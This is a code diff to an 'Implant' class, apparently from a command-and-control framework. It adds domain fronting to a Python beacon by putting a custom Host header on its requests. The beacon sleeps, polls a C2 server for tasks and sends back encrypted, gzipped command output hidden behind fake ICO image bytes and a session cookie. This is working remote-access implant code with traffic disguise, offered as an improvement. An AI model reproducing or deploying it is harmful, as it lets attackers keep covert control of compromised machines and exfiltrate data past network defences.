@@ -21,6 +21,7 @@ class Implant(object):
     self.Proxy = proxy
     self.Arch = arch
     self.Domain = domain
+    self.DomainFrontHeader = get_dfheader()
     self.Alive = "Yes"
     self.UserAgent = get_defaultuseragent()
     self.Sleep = get_defaultbeacon()
@@ -31,7 +32,7 @@ class Implant(object):
     self.AllBeaconURLs = get_otherbeaconurls()
     self.AllBeaconImages = get_images()
     self.PythonCore = """import urllib2, os, subprocess, re, datetime, time, base64, string, random
-
+hh = '%s'
 timer = %s
 icoimage = [%s]
 urls = [%s]
@@ -57,10 +58,11 @@ while(True):
   server = "%%s/%%s%%s" %% (serverclean, random.choice(urls), uri)
   try:
     time.sleep(timer)
-    o = urllib2.build_opener()
-    o.addheaders = [('User-Agent', '%s')]
-    response = o.open(server)
-    html = response.read()
+    ua='%s'
+    if hh: req=urllib2.Request(server,headers={'Host':hh,'User-agent':ua})
+    else: req=urllib2.Request(server,headers={'User-agent':ua})
+    res=urllib2.urlopen(req);
+    html = res.read()
   except Exception as e:
     E = e
     #print "error %%s" %% e
@@ -85,15 +87,21 @@ while(True):
             data = base64.b64decode(random.choice(icoimage))
             dataimage = data.ljust( 1500, '\\0' )
             dataimagebytes = dataimage+(encrypt(key, returnval, gzip=True))
-            opener.addheaders.append(('Cookie', "SessionID=%%s" %% postcookie))
-            urllib2.install_opener(opener)
-            req = urllib2.Request(server, dataimagebytes)
-            response = urllib2.urlopen(req)
+
+            if hh: req=urllib2.Request(server,dataimagebytes,headers={'Host':hh,'User-agent':ua,'Cookie':"SessionID=%%s" %% postcookie})
+            else: req=urllib2.Request(server,dataimagebytes,headers={'User-agent':ua,'Cookie':"SessionID=%%s" %% postcookie})
+            res=urllib2.urlopen(req);
+            response = res.read()
+
+            #opener.addheaders.append(('Cookie', "SessionID=%%s" %% postcookie))
+            #urllib2.install_opener(opener)
+            #req = urllib2.Request(server, dataimagebytes)
+            #response = urllib2.urlopen(req)
 
     except Exception as e:
       E = e
       #print "error %%s" %% e
-      w = \"\"""" % (self.Sleep, self.AllBeaconImages, self.AllBeaconURLs, self.KillDate, self.Key, self.RandomURI, self.ServerURL, self.UserAgent)
+      w = \"\"""" % (self.DomainFrontHeader,self.Sleep, self.AllBeaconImages, self.AllBeaconURLs, self.KillDate, self.Key, self.RandomURI, self.ServerURL, self.UserAgent)
     self.C2Core = """
 $key="%s"
 $global:sleeptime = '%s'
